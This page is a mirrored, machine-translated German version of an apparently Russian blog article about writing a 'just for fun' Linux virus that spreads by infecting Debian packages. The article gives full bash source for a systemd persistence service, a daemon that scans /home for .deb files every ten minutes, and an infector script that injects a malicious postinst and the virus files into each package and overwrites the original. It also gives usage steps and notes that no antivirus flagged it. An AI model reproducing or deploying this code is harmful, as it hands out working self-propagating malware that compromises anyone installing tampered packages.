<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü•ô üë©üèª‚Äçüî¨ üë©‚Äç‚úàÔ∏è Trojanischer Pinguin: Einen Virus f√ºr Linux erstellen üëßüèΩ üëäüèø üëî</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Nein, ich werde nicht sagen, wie ich meine Ransomware Ransomware, Miner schreiben oder eine super neue Sicherheitsl√ºcke ausnutzen soll, wie Sie vielle...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Trojanischer Pinguin: Einen Virus f√ºr Linux erstellen</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/430460/">  Nein, ich werde nicht sagen, wie ich meine Ransomware Ransomware, Miner schreiben oder eine super neue Sicherheitsl√ºcke ausnutzen soll, wie Sie vielleicht denken.  Und noch mehr, ich bin nicht bestrebt, den Holivar "Ist Linux sicherer als Windows? (Ja)" zu erheben.  Mein Ziel war es, einen einfachen Virus f√ºr Linux zu schreiben, sozusagen niemand, "Just for Fun", dessen einzige Funktion darin besteht, seine Kopie zu verbreiten.  √úber das, was ich getan habe, werde ich in diesem Artikel erz√§hlen.  Am Ende werde ich einen Link zu GitHub mit der Quelle geben. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/f5e/05a/703/f5e05a7031834bc8fb94b82b25429f68.jpg" alt="Bild"><br><a name="habracut"></a><br><h4>  Haftungsausschluss </h4><br>  Dieser Artikel wurde zu Bildungszwecken verfasst.  Der Autor ermutigt die Leser in keinem Fall, die Gesetze der Russischen F√∂deration zu verletzen.  Bitte wiederholen Sie die in diesem Artikel beschriebenen Schritte nicht, ohne zuerst Kapitel 28 des Strafgesetzbuchs der Russischen F√∂deration gelesen zu haben. <br><br><h4>  Und was werden wir eigentlich tun? </h4><br>  Der einfachste Implementierungsmechanismus zur Verbreitung des Virus schien mir √ºber modifizierte deb / rpm-Pakete verbreitet zu werden.  Die deb- und rpm-Pakete sind jetzt das beliebteste Distributionstool f√ºr Linux.  Ich habe mich f√ºr deb entschieden, da die Anzahl der Benutzer von Debian-basierten Distributionen Vorrang vor den Benutzern von Red Hat und seinen "Followern" hat. <br><br>  Es ist auch erforderlich, dass der Virus automatisch startet und nach jeder bestimmten Zeit den Computer nach Deb-Paketen durchsucht.  Um das Debuggen zu vereinfachen, habe ich einen Zeitraum von 10 Minuten gew√§hlt. <br><br><h4>  Was ist ein Deb-Paket? </h4><br>  Das Deb-Paket ist ein Archiv im <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">AR-</a> Format, das keine Komprimierung verwendet.  Es gibt drei weitere Dateien im Archiv: <i>debian-bynary</i> , <i>control.tar</i> und <i>data.tar</i> <br><br>  <i>debian.binary</i> - eine Textdatei, die eine Version des Deb-Paketformats enth√§lt, im Moment schreiben sie dort immer "2.0". <br><br>  <i>control.tar</i> - Archiv mit Dateien, die Informationen √ºber das Paket (z. B. die erforderliche Steuerdatei) und Pakete enthalten, die f√ºr die Installation des Pakets erforderlich sind (z. B. Preinst-, Postinst-, Prerm- und Postrm-Skripte, die vor / nach der Installation / Deinstallation des Pakets ausgef√ºhrt werden).  Es kann mit gzip oder xz komprimiert werden. In diesem Fall wird die Erweiterung .gz oder .xz zum Archivnamen hinzugef√ºgt. <br><br>  <i>data.tar</i> - Archiv mit Verzeichnissen, die installierte Dateien enthalten.  Verzeichnisse werden durch einen Baum dargestellt, in dessen Form sie in das Stammverzeichnis des Dateisystems extrahiert werden sollen.  Kann mit gzip, bzip2, lzma, xz komprimiert werden. <br><br>  Wir m√ºssen auf die Steuerdatei aus dem Archiv control.tar achten.  Diese Datei enth√§lt Informationen √ºber das Paket, wie z. B. den Autor, die Beschreibung, die Version, die Paketpriorit√§t im System usw. Ich interessiere mich f√ºr das <i>Abh√§ngigkeitsfeld</i> , in dem die Abh√§ngigkeiten angezeigt werden (Pakete, ohne die es mit diesem Paket nicht funktionieren kann).  In diesem Feld <i>h√§ngt</i> unser Virus die Dienstprogramme <i>fakeroot</i> und <i>dpkg an</i> , die zum √Ñndern anderer Pakete auf dem infizierten Computer ben√∂tigt werden. <br><br>  Um ein Deb-Paket zu erstellen, wird das Stammverzeichnis des Pakets erstellt.  Verzeichnisse mit installierten Dateien und das DEBIAN-Verzeichnis mit Servicedateien, einschlie√ülich Steuerelementen und Skripten f√ºr die Installation / Deinstallation, werden darin abgelegt.  Dann wird der <i>Befehl fakeroot dpkg-deb --build ./path ausgef√ºhrt</i> . <br><br><h4>  Zuerst gab es einen D√§mon </h4><br>  Zum Zeitpunkt des Schreibens des Virus hatte ich noch eine schlechte Vorstellung davon, was <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Cron ist</a> , und so schrieb ich meinen eigenen Daemon f√ºr <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">systemd</a> .  Ich habe die Datei trojan_penguin.service erstellt, die im Verzeichnis / lib / systemd / system abgelegt wird, und Folgendes hinzugef√ºgt: <br><br><pre><code class="bash hljs">[Unit] Description = XXX [Service] ExecStart=/usr/bin/trojan_penguin.sh Type=fork [Install] WantedBy=multi-user.target</code> </pre> <br>  <i>ExecStart = / usr / bin / trojan_penguin.sh</i> - hier habe ich den Pfad zur Datei (zum zuk√ºnftigen Virus) angegeben, die beim Systemstart gestartet werden soll. <br><br>  <i>Typ = Gabel</i> - Diese Zeile gibt an, dass der Prozess vom √ºbergeordneten Prozess abzweigen soll. <br>  Ich habe keine Notwendigkeit f√ºr eine PID-Datei gesehen, also habe ich sie nicht hinzugef√ºgt. <br><blockquote>  In den Handb√ºchern zum Schreiben Ihres Daemons wird vorgeschlagen, .service-Dateien in den Verzeichnissen / usr / lib / systemd / system / oder / etc / systemd / system / abzulegen.  Aber in meinem Ubunt habe ich das Verzeichnis / lib / systemd / system gefunden.  (Ich habe dort apache2.service).  Vielleicht schreibt jemand in den Kommentaren, wof√ºr dieses Verzeichnis gedacht ist und wie es sich von den beiden anderen unterscheidet. </blockquote><br>  Die Datei <i>/usr/bin/trojan_penguin.sh</i> Ich habe diese: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash #debug=".../Programming/projects/TrojanPenguin" debug="" #    ,    if ! [ -d $debug/var/log/trojan_penguin/ ]; then mkdir $debug/var/log/trojan_penguin fi #   , #   10  while [ 1 ] do list=$(find /home -name "*.deb") # deb- #        for line in $list do $debug/usr/bin/tp_infect.sh $line &gt;&gt; $debug/var/log/trojan_penguin/log # ,  ,      log done date &gt; $debug/var/log/trojan_penguin/last_start #     (     ) sleep 600 # (60 * 10  = 10 ) done</span></span></code> </pre><br>  Wir suchen nach Deb-Paketen im Abschnitt / home (wo kann ich sie sonst noch finden?). Die Pfade zu den gefundenen Dateien werden in die Listenvariable geschrieben.  Dann iterieren Sie einfach √ºber alle Zeilen von Zeile und f√ºhren f√ºr jede Datei das Skript tp_infect.sh aus, das diese Datei infiziert.  Als ich den Virus schrieb, befanden sich die Skripte in einem separaten Verzeichnis, und der Einfachheit halber erstellte ich eine <i>Debug-</i> Variable, in die ich den Pfad zu diesem Ordner schrieb. <br><br>  Der Daemon ist bereit. Es bleibt zu lernen, wie er ausgef√ºhrt wird, wenn das System gestartet wird.  Daf√ºr habe ich ein <i>Postinstall-</i> Skript geschrieben.  Es wird sofort nach der Installation des infizierten Pakets gestartet und zeigt an, dass unser Virus mit dem System startet.  Ich habe es in das Verzeichnis "/ usr / bin /" gestellt, um es von dort in die infizierten Pakete zu kopieren. <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash #debug="/home/dima/Dropbox/Programming/projects/TrojanPenguin/TrojanPenguin" debug="" systemctl daemon-reload #  ,           systemctl enable trojan_penguin.service #     systemctl start trojan_penguin.service # </span></span></code> </pre><br><h4>  √Ñndern des Deb-Pakets </h4><br>  Wie ich oben geschrieben habe, k√∂nnen in einem Deb-Paket enthaltene Archive unterschiedliche Berechtigungen haben.  Ich habe mich nicht darum gek√ºmmert und nur den Fall betrachtet, wenn Archive mit .xz komprimiert werden.  Die f√ºr die √Ñnderung verantwortliche Datei <i>/usr/bin/tp_infect.sh hat</i> den folgenden Inhalt erhalten: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash #debug=".../Programming/projects/TrojanPenguin" debug="" temp="$debug/tmp/trojan_penguin" #   mkdir $temp mkdir $temp/new mkdir $temp/new/DEBIAN #  ar -p $1 data.tar.xz | tar -xJ -C $temp/new ar -p $1 control.tar.xz | tar -xJ -C $temp/new/DEBIAN/ # control #  control     "Deepends",    "Deepends",   ,     . cp $temp/new/DEBIAN/control $temp/orig_control cat $temp/orig_control | grep --before-context=100 Depends | grep -v Depends &gt; $temp/new/DEBIAN/control cat $temp/orig_control | grep Depends | tr -d '\r\n' &gt;&gt; $temp/new/DEBIAN/control echo ", fakeroot, python" &gt;&gt; $temp/new/DEBIAN/control cat $temp/orig_control | grep --after-context=100 Depends | grep -v Depends &gt;&gt; $temp/new/DEBIAN/control #    cp $debug/usr/bin/tp_postinst.sh $temp/new/DEBIAN/postinst #     ,    if ! [ -d $temp/new/usr ]; then mkdir $temp/new/usr fi if ! [ -d $temp/new/usr/bin ]; then mkdir $temp/new/usr/bin fi if ! [ -d $temp/new/lib ]; then mkdir $temp/new/lib fi if ! [ -d $temp/new/lib/systemd ]; then mkdir $temp/new/lib/systemd fi if ! [ -d $temp/new/lib/systemd/system ]; then mkdir $temp/new/lib/systemd/system fi #   cp $debug/usr/bin/trojan_penguin.sh $temp/new/usr/bin/trojan_penguin.sh cp $debug/usr/bin/tp_infect.sh $temp/new/usr/bin/tp_infect.sh cp $debug/usr/bin/tp_postinst.sh $temp/new/usr/bin/tp_postinst.sh cp $debug/lib/systemd/system/trojan_penguin.service $temp/new/lib/systemd/system/ # ,        ,    . fakeroot dpkg-deb --build $temp/new cp $temp/new.deb $1 rm -R $temp</span></span></code> </pre><br><h4>  Probleme mit der Nachinstallation </h4><br>  Alles w√§re gut, aber jetzt haben wir ein Problem.  Aber was ist, wenn das Paket bereits nach der Installation installiert ist?  Das urspr√ºngliche Postinstal kann in verschiedenen Sprachen geschrieben werden (Python, Bash ...), vielleicht ist es sogar eine Bin√§rdatei.  Dies erlaubt uns nicht, einfach unsere Nachinstallation zu nehmen und hinzuzuf√ºgen.  Ich habe dieses Problem wie folgt gel√∂st: <br><br>  <i>Dem</i> Skript <i>tp_infect.sh wurde</i> Folgendes <i>hinzugef√ºgt</i> : <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#,     postinstal.  ,      . if [ -f $temp/new/usr/bin/postinst ]; then cp $temp/new/DEBIAN/postinst $debug/usr/bin/tp_orig_postinst fi</span></span></code> </pre><br>  Und nach der <i>Installation</i> ist dies: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#      if [ -f $debug/usr/bin/tp_orig_postinst ]; then $debug/usr/bin/tp_orig_postinst rm $debug/usr/bin/tp_orig_postinst fi</span></span></code> </pre><br>  Ich habe ein Problem gel√∂st, aber ein anderes ist aufgetaucht.  Unser Virus √§ndert das Paket, auch wenn es bereits infiziert ist.  Nach der √Ñnderung <i>erkennt</i> der Virus, dass das Paket eine <i>Nachinstallation enth√§lt</i> (die eigentlich unsere ist). Verschieben Sie diese nach / usr / bin /, wodurch das Original √ºberschrieben wird.  Um dies zu vermeiden, habe ich "tp_infect.sh" √ºberpr√ºft, ob wir diese Datei ge√§ndert haben oder nicht: <br><br><pre> <code class="bash hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> [ -f <span class="hljs-variable"><span class="hljs-variable">$temp</span></span>/new/usr/bin/trojan_penguin.sh ]; <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> rm -R <span class="hljs-variable"><span class="hljs-variable">$temp</span></span> <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span> 0 <span class="hljs-keyword"><span class="hljs-keyword">fi</span></span></code> </pre><br><h4>  Zusammenf√ºgen </h4><br>  Der Virus ist bereit.  Hier ist ein <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Link zu GitHub</a> , wie versprochen.  Dieser Virus kann aus dem Repository in ein separates Deb-Paket (run makedeb.sh) kompiliert werden.  Um den Virus in ein beliebiges Paket zu injizieren, f√ºhren Sie einfach den folgenden Befehl aus: <br><br><pre> <code class="bash hljs">tp_infect.sh /  deb-/</code> </pre><br>  Es gibt zwei Kopien des <i>Postinst-</i> Skripts im Repository <br><br>  <i>DEBIAN / postinst</i> - Diese Kopie wird nur ausgef√ºhrt, wenn ein leeres Paket mit einem Virus installiert wird.  Ich habe es auskommentiert, damit der Virus nach der Installation nicht startet und Pakete nur per Befehl √§ndert. <br><br>  <i>usr / bin / postinst</i> - Diese Kopie wird in die infizierten Pakete eingef√ºgt. <br><br><h4>  Zusammenfassung </h4><br>  Und die Schlussfolgerung ist ohne diesen Artikel offensichtlich: Sie sollten keine Programme aus nicht √ºberpr√ºften Quellen herunterladen und ausf√ºhren. <br><br>  Aus Neugier habe ich das Virus-Deb-Paket zur Analyse an VirusTotal gesendet.  Zum Zeitpunkt des Schreibens hat es kein einziges Antivirenprogramm erkannt.  Hier ist der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Link</a> zum Bericht.  Ich frage mich, wie viel Zeit vergehen sollte und wie viele Hosts mit diesem Virus infiziert werden m√ºssen, damit Virenschutzprogramme darauf achten k√∂nnen. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de430460/">https://habr.com/ru/post/de430460/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de430450/index.html">Entwicklungsmodell am Beispiel einer stapelbasierten CPU</a></li>
<li><a href="../de430452/index.html">Feuer, Wasser und feines Spray. Wie Bewohner und Besucher des Lakhta Centers vor Feuer gesch√ºtzt werden</a></li>
<li><a href="../de430454/index.html">Ich bin umgeben von Idioten oder wie man in einem Team arbeitet</a></li>
<li><a href="../de430456/index.html">Legal Project Management Books von PMI</a></li>
<li><a href="../de430458/index.html">Mehrschichtiger Graphen-Supraleiter: Untersuchung flacher Zonen</a></li>
<li><a href="../de430462/index.html">In Russland wurde eine Gesetzesvorlage zur Bereitstellung von Daten von Nutzern sozialer Netzwerke f√ºr einen unbegrenzten Personenkreis ver√∂ffentlicht. Soziale Netzwerke gegen</a></li>
<li><a href="../de430466/index.html">Mini AI Cup # 3: Einen Top Bot schreiben</a></li>
<li><a href="../de430468/index.html">Sensibilisierung der B√ºrger</a></li>
<li><a href="../de430470/index.html">Warum den Kontext auf dem Kundenkonto pflegen - ehrlich und profitabel</a></li>
<li><a href="../de430472/index.html">DIY nahtloses DECT-Netzwerk</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>